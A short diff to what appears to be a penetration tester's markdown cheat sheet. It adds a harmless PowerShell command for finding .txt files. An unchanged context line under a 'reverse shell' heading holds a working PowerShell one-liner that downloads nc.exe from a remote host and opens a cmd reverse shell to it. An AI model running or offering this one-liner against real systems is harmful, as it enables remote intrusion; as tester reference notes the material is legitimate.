@@ -495,6 +495,12 @@ reverse shell
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadFile('http://192.168.0.100/nc.exe', 'C:\users\XXX\desktop\nc.exe');C:\users\XXX\desktop\nc.exe 192.168.0.100 80 -e cmd"
 ```
 
+find specific files
+
+```powershell
+Get-ChildItem -Path "C:\Folder" -Recurse -Filter "*.txt"
+```
+
 ### :open_file_folder: Firefox
 
 disable search in address bar function, easier to test
